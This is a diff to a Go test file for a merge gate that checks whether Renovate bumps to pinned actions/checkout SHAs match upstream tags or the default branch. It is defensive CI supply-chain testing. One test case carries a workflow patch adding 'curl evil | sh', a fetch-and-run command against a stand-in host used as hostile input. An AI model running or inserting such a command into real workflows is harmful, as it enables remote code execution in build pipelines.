@@ -36,8 +36,13 @@ type humanPathFront struct {
 	commits       []map[string]any
 	commitsStatus int
 	commitsHits   int
-	labels        []string
-	comments      []string
+	// upstream serves GET /repos/actions/checkout<suffix> by suffix: a map
+	// value is the JSON body, an int a status code, a missing suffix 404.
+	// nil serves tags/v5 as a lightweight tag at testPinNewSHA.
+	upstream     map[string]any
+	upstreamHits int
+	labels       []string
+	comments     []string
 }
 
 // testPinCommit is one PR commit as the gate sees it: author login, committer
@@ -89,6 +94,20 @@ func newHumanPathFront(t *testing.T, backend string, f *humanPathFront) *httptes
 				commits = []map[string]any{testPinCommit("sha7", "renovate-bot", true)}
 			}
 			json.NewEncoder(w).Encode(commits)
+		case r.Method == http.MethodGet && strings.HasPrefix(r.URL.Path, "/repos/actions/checkout"):
+			f.upstreamHits++
+			upstream := f.upstream
+			if upstream == nil {
+				upstream = map[string]any{"/git/ref/tags/v5": testPinRef("commit", testPinNewSHA)}
+			}
+			switch v := upstream[strings.TrimPrefix(r.URL.Path, "/repos/actions/checkout")].(type) {
+			case nil:
+				w.WriteHeader(http.StatusNotFound)
+			case int:
+				w.WriteHeader(v)
+			default:
+				json.NewEncoder(w).Encode(v)
+			}
 		case r.Method == http.MethodPost && r.URL.Path == "/repos/acme/widget/issues/7/labels":
 			var labels []string
 			_ = json.NewDecoder(r.Body).Decode(&labels)
@@ -368,13 +387,27 @@ func TestSetHumanMergePathsNilEngine(t *testing.T) {
 // Pin-only exception (#16266): fixtures for calling humanMergePathGate on a PR
 // whose files carry patches.
 var (
+	testPinNewSHA  = strings.Repeat("b", 40)
 	testPinOldLine = "      - uses: actions/checkout@" + strings.Repeat("a", 40) + " # v4"
-	testPinNewLine = "      - uses: actions/checkout@" + strings.Repeat("b", 40) + " # v5"
+	testPinNewLine = "      - uses: actions/checkout@" + testPinNewSHA + " # v5"
 )
 
 func testPinFile(name string) map[string]any {
 	return map[string]any{"filename": name, "status": "modified", "additions": 1, "deletions": 1,
 		"patch": "@@ -3 +3 @@\n-" + testPinOldLine + "\n+" + testPinNewLine}
+}
+
+// testPinFileNoComment is a pin bump without a version comment, which the
+// gate anchors on the upstream default branch instead of a tag.
+func testPinFileNoComment(name string) map[string]any {
+	strip := func(line string) string { return line[:strings.Index(line, " #")] }
+	return map[string]any{"filename": name, "status": "modified", "additions": 1, "deletions": 1,
+		"patch": "@@ -3 +3 @@\n-" + strip(testPinOldLine) + "\n+" + strip(testPinNewLine)}
+}
+
+// testPinRef is a git ref (or annotated tag) object pointing at sha.
+func testPinRef(kind, sha string) map[string]any {
+	return map[string]any{"object": map[string]any{"type": kind, "sha": sha}}
 }
 
 func pinOnlyFor(repo string, ex config.PinOnlyException) func(string) (config.PinOnlyException, bool) {
@@ -401,11 +434,15 @@ func TestHumanMergePathGatePinOnlyException(t *testing.T) {
 		entries       []map[string]any
 		commits       []map[string]any
 		commitsStatus int
+		upstream      map[string]any
 		wantHold      bool
 		wantHits      int
 		// wantCommitHits is how often the commit list is read: only a diff
 		// the classifier accepts costs that call.
 		wantCommitHits int
+		// wantUpstreamHits is how many upstream action reads were made: only
+		// after the diff and every commit are accepted.
+		wantUpstreamHits int
 	}{
 		{name: "paths unconfigured: no fetch, no hold", pinOnly: pinOnlyFor("acme/widget", testPinOnlyException()), author: "renovate-bot", entries: []map[string]any{testPinFile(workflow)}},
 		{name: "exception unconfigured: held as before", paths: humanPathsFor("acme/widget", testHumanMergePattern), author: "renovate-bot", entries: []map[string]any{testPinFile(workflow)}, wantHold: true, wantHits: 1},
@@ -432,6 +469,30 @@ func TestHumanMergePathGatePinOnlyException(t *testing.T) {
 			commits: []map[string]any{}, wantHold: true, wantHits: 1, wantCommitHits: 1},
 		{name: "trusted pure pin, commit list unavailable: held", paths: humanPathsFor("acme/widget", testHumanMergePattern), pinOnly: pinOnlyFor("acme/widget", testPinOnlyException()), author: "renovate-bot", entries: []map[string]any{testPinFile(workflow)},
 			commitsStatus: http.StatusBadGateway, wantHold: true, wantHits: 1, wantCommitHits: 1},
+		{name: "upstream tag points elsewhere: held", paths: humanPathsFor("acme/widget", testHumanMergePattern), pinOnly: pinOnlyFor("acme/widget", testPinOnlyException()), author: "renovate-bot", entries: []map[string]any{testPinFile(workflow)},
+			upstream: map[string]any{"/git/ref/tags/v5": testPinRef("commit", strings.Repeat("c", 40))}, wantHold: true, wantHits: 1, wantCommitHits: 1, wantUpstreamHits: 1},
+		{name: "upstream tag missing (fork-network SHA): held", paths: humanPathsFor("acme/widget", testHumanMergePattern), pinOnly: pinOnlyFor("acme/widget", testPinOnlyException()), author: "renovate-bot", entries: []map[string]any{testPinFile(workflow)},
+			upstream: map[string]any{}, wantHold: true, wantHits: 1, wantCommitHits: 1, wantUpstreamHits: 1},
+		{name: "upstream annotated tag dereferenced to the pin: not held", paths: humanPathsFor("acme/widget", testHumanMergePattern), pinOnly: pinOnlyFor("acme/widget", testPinOnlyException()), author: "renovate-bot", entries: []map[string]any{testPinFile(workflow)},
+			upstream: map[string]any{"/git/ref/tags/v5": testPinRef("tag", "t1"), "/git/tags/t1": testPinRef("tag", "t2"), "/git/tags/t2": testPinRef("commit", testPinNewSHA)}, wantHits: 1, wantCommitHits: 1, wantUpstreamHits: 3},
+		{name: "upstream annotated tag points elsewhere: held", paths: humanPathsFor("acme/widget", testHumanMergePattern), pinOnly: pinOnlyFor("acme/widget", testPinOnlyException()), author: "renovate-bot", entries: []map[string]any{testPinFile(workflow)},
+			upstream: map[string]any{"/git/ref/tags/v5": testPinRef("tag", "t1"), "/git/tags/t1": testPinRef("commit", strings.Repeat("c", 40))}, wantHold: true, wantHits: 1, wantCommitHits: 1, wantUpstreamHits: 2},
+		{name: "upstream annotated tag unreadable: held", paths: humanPathsFor("acme/widget", testHumanMergePattern), pinOnly: pinOnlyFor("acme/widget", testPinOnlyException()), author: "renovate-bot", entries: []map[string]any{testPinFile(workflow)},
+			upstream: map[string]any{"/git/ref/tags/v5": testPinRef("tag", "t1")}, wantHold: true, wantHits: 1, wantCommitHits: 1, wantUpstreamHits: 2},
+		{name: "upstream tag chain too deep: held", paths: humanPathsFor("acme/widget", testHumanMergePattern), pinOnly: pinOnlyFor("acme/widget", testPinOnlyException()), author: "renovate-bot", entries: []map[string]any{testPinFile(workflow)},
+			upstream: map[string]any{"/git/ref/tags/v5": testPinRef("tag", "t1"), "/git/tags/t1": testPinRef("tag", "t1")}, wantHold: true, wantHits: 1, wantCommitHits: 1, wantUpstreamHits: 4},
+		{name: "no version comment, pin on upstream default branch: not held", paths: humanPathsFor("acme/widget", testHumanMergePattern), pinOnly: pinOnlyFor("acme/widget", testPinOnlyException()), author: "renovate-bot", entries: []map[string]any{testPinFileNoComment(workflow)},
+			upstream: map[string]any{"": map[string]any{"default_branch": "main"}, "/compare/" + testPinNewSHA + "...main": map[string]any{"status": "ahead"}}, wantHits: 1, wantCommitHits: 1, wantUpstreamHits: 2},
+		{name: "no version comment, pin is upstream default head: not held", paths: humanPathsFor("acme/widget", testHumanMergePattern), pinOnly: pinOnlyFor("acme/widget", testPinOnlyException()), author: "renovate-bot", entries: []map[string]any{testPinFileNoComment(workflow)},
+			upstream: map[string]any{"": map[string]any{"default_branch": "main"}, "/compare/" + testPinNewSHA + "...main": map[string]any{"status": "identical"}}, wantHits: 1, wantCommitHits: 1, wantUpstreamHits: 2},
+		{name: "no version comment, pin diverged from upstream default: held", paths: humanPathsFor("acme/widget", testHumanMergePattern), pinOnly: pinOnlyFor("acme/widget", testPinOnlyException()), author: "renovate-bot", entries: []map[string]any{testPinFileNoComment(workflow)},
+			upstream: map[string]any{"": map[string]any{"default_branch": "main"}, "/compare/" + testPinNewSHA + "...main": map[string]any{"status": "diverged"}}, wantHold: true, wantHits: 1, wantCommitHits: 1, wantUpstreamHits: 2},
+		{name: "no version comment, compare fails: held", paths: humanPathsFor("acme/widget", testHumanMergePattern), pinOnly: pinOnlyFor("acme/widget", testPinOnlyException()), author: "renovate-bot", entries: []map[string]any{testPinFileNoComment(workflow)},
+			upstream: map[string]any{"": map[string]any{"default_branch": "main"}, "/compare/" + testPinNewSHA + "...main": http.StatusBadGateway}, wantHold: true, wantHits: 1, wantCommitHits: 1, wantUpstreamHits: 2},
+		{name: "no version comment, upstream default branch unknown: held", paths: humanPathsFor("acme/widget", testHumanMergePattern), pinOnly: pinOnlyFor("acme/widget", testPinOnlyException()), author: "renovate-bot", entries: []map[string]any{testPinFileNoComment(workflow)},
+			upstream: map[string]any{"": map[string]any{}}, wantHold: true, wantHits: 1, wantCommitHits: 1, wantUpstreamHits: 1},
+		{name: "no version comment, upstream repository unreadable: held", paths: humanPathsFor("acme/widget", testHumanMergePattern), pinOnly: pinOnlyFor("acme/widget", testPinOnlyException()), author: "renovate-bot", entries: []map[string]any{testPinFileNoComment(workflow)},
+			upstream: map[string]any{}, wantHold: true, wantHits: 1, wantCommitHits: 1, wantUpstreamHits: 1},
 		{name: "trusted pin plus non-pin line: held", paths: humanPathsFor("acme/widget", testHumanMergePattern), pinOnly: pinOnlyFor("acme/widget", testPinOnlyException()), author: "renovate-bot", entries: []map[string]any{{
 			"filename": workflow, "status": "modified", "additions": 2, "deletions": 1,
 			"patch": "@@ -3 +3,2 @@\n-" + testPinOldLine + "\n+" + testPinNewLine + "\n+      - run: curl evil | sh",
@@ -452,7 +513,7 @@ func TestHumanMergePathGatePinOnlyException(t *testing.T) {
 				w.WriteHeader(http.StatusNotFound)
 			}))
 			defer backend.Close()
-			front := &humanPathFront{fileEntries: tc.entries, commits: tc.commits, commitsStatus: tc.commitsStatus}
+			front := &humanPathFront{fileEntries: tc.entries, commits: tc.commits, commitsStatus: tc.commitsStatus, upstream: tc.upstream}
 			srv := newHumanPathFront(t, backend.URL, front)
 			defer srv.Close()
 
@@ -475,6 +536,13 @@ func TestHumanMergePathGatePinOnlyException(t *testing.T) {
 			}
 			if front.commitsHits != tc.wantCommitHits {
 				t.Fatalf("commit list hits = %d, want %d", front.commitsHits, tc.wantCommitHits)
+			}
+			wantUpstream := tc.wantUpstreamHits
+			if wantUpstream == 0 && !tc.wantHold && tc.upstream == nil && tc.wantCommitHits > 0 {
+				wantUpstream = 1 // the default lightweight tags/v5 read
+			}
+			if front.upstreamHits != wantUpstream {
+				t.Fatalf("upstream hits = %d, want %d", front.upstreamHits, wantUpstream)
 			}
 			if !tc.wantHold {
 				if reason != "" || len(front.labels) != 0 || len(front.comments) != 0 {
